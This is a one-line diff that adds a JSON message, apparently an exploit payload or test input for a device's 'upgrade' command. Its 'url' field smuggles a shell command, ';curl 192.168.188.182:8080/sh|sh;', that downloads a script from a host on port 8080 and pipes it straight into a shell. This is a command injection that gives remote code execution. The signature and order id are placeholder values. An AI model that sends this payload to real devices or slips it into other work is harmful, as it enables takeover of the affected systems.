@@ -1,0 +1,1 @@
+{"now": "1714350566", "body": {"command": {"type": "upgrade", "url": ";curl 192.168.188.182:8080/sh|sh;", "signature": "abcd", "wait": "1", "orderid": "abcd"}}}
